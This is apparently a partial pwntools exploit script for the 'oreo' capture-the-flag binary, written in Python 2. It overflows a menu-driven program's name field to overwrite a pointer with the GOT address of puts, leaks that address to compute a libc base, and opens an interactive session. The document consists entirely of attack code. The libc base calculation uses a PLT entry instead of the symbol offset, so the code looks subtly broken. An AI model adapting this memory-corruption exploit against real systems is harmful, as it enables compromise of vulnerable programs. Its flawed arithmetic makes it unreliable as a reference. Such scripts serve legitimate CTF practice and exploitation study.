from pwn import *
context.log_level = 'debug'
sh = process('./oreo')
elf = ELF('./oreo')
libc = ELF('./libc.so.6')

def add(des,name):
	sh.sendline('1')
	sh.sendlineafter('name: ',name)
	sh.sendlineafter('description: ',des)

def show_rif():
	sh.sendline('2')

def order():
	sh.sendline('3')

def message(msg):
	sh.sendline('4')
	sh.sendlineafter('order: ',msg)

def show_stats():
	sh.sendline('5')

#----------leak libc addr-------------
add('a'*25,'a'*27+p32(elf.got['puts']))
show_rif()
sh.recvuntil('Description: ')
puts_addr = u32(sh.recvuntil('\n',drop=	True).ljust(4,'\x00'))
libc_base = puts_addr - libc.plt['puts']
print 'libc_base: '+hex(libc_base)

sh.interactive()
